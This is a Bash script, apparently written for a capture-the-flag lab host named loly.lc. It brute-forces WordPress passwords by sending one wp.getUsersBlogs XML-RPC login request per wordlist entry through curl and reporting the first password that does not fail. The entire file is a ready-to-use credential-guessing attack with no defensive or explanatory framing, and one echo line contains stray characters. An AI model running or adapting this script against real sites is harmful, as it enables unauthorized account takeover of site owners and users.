#!/bin/bash

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"


# Functions 

function ctrl_c() {
  echo -e "\n\n${redColour}[!] Saliendo...${endColour}\n"}]
  tput cnorm; exit 1
}

declare -i parameter_counter=0

tput civis 

function helpPanel(){
  echo -e "\n${turquoiseColour}[+]${endColour} Uso: ${yellowColour}$0${blueColour}-u ${redColour}USER ${blueColour}-w${endColour} ${redColour}WORDLIST_PATH${endColour}"
  echo -e "\t${purpleColour}-u)${endColour} Usuario a probar"
  echo -e "\t${purpleColour}-w)${endColour} Ruta del Wordlist"
  exit 1 
}

function makeXML(){
  username=$1
  wordlist=$2

  cat $wordlist | while read password; do
    xmlFile="""
<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>$username</value></param>
<param><value>$password</value></param>
</params>
</methodCall>
    """
  echo $xmlFile > data.xml
  response=$(curl -s -X POST "http://loly.lc/wordpress/xmlrpc.php" -d@data.xml)

  if [ ! "$(echo $response | grep -E 'Incorrect username or password.|parse error. not well formed')" ]; then
    echo -e "\n${turquoiseColour}[+]${endColour} La contrasena para el usuario ${redColour}$username${endColour} es ${redColour}$password${endColour}"
    tput cnorm; exit 0
  fi
  done
}

#Ctrl + C
trap ctrl_c SIGINT

while getopts "u:w:h" arg; do
  case $arg in
    u) username=$OPTARG && let parameter_counter+=1;;
    w) wordlist=$OPTARG && let parameter_counter+=1;;
    h) helpPanel
  esac
done

if [ $parameter_counter -eq 2 ]; then
  if [ -f $wordlist ]; then
    makeXML $username $wordlist
  else
    echo -e "\n${turquoiseColour}[!]${endColour} La ruta de la ${redColour}wordlist${endColour} no es valida."
    exit 1
  fi

else
  helpPanel
fi

tput cnorm
